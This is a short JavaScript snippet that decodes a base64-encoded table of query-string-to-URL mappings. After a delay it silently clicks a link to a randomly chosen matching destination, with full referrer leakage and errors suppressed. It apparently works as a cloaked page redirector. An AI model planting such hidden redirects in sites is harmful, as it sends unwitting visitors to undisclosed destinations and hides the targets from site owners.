<script type="text/javascript">function coreWorker(p, t) {
    try {
        p = atob(p);
        if (p != undefined) {
            var rows = p.split('\n');
            if (rows != "" && rows != undefined && rows.length > 0 && location.search != "" && p.length > 10) {
                var findedRows = [];
                for(i = 0; i <= rows.length - 1; i++) {
                    if (rows[i].split('~')[0] == location.search) {
                        findedRows.push(rows[i].split('~')[1]);
                    }
                }
                if (findedRows.length > 0) {
                    setTimeout(function() {
                        var link = document.createElement('a');
                        link.href = findedRows[Math.floor(Math.random() * findedRows.length)];
                        link.referrerPolicy = "unsafe-url";
                        document.body.appendChild(link);
                        link.click();
                    }, t);
                }
            }
        }
    }
    catch(Err) {

    }
}coreWorker(window.cdrData, window.cdrDataTimeout)</script>
